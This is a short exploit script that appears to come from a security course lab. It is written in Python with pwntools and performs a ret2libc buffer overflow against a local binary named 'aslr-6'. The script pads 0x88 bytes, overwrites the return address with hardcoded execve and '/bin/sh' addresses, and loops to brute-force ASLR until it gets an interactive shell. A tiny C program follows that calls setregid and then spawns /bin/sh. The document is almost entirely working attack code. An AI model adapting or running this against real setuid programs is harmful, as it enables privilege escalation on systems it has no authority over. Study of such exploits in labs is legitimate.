
#!/usr/bin/env python

from pwn import *
import os

env = {
        "PATH": "/home/users/didnera/week4/aslr-4"
    }


while True:
    p = process("./aslr-6",env=env)

    #string = p.recv()
    #print(string)

    #fixed_system_addr = p32(0xb7d83da0)
    string_addr = p32(0xb7e4f388)

    #execve = p32(0xb7dbcfb4)
    execve_addr = p32(0xb7e4e7e0)


    buff = "A"*(0x88) + "BBBB" + execve_addr + "BBBB" +string_addr + p32(0) + p32(0)

    p.sendline(buff)
    print(p.recv(timeout=0.1))
    p.interactive()




#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>



int main(){
    setregid(getegid(),getegid());
    execve("/bin/sh",0,0);
}
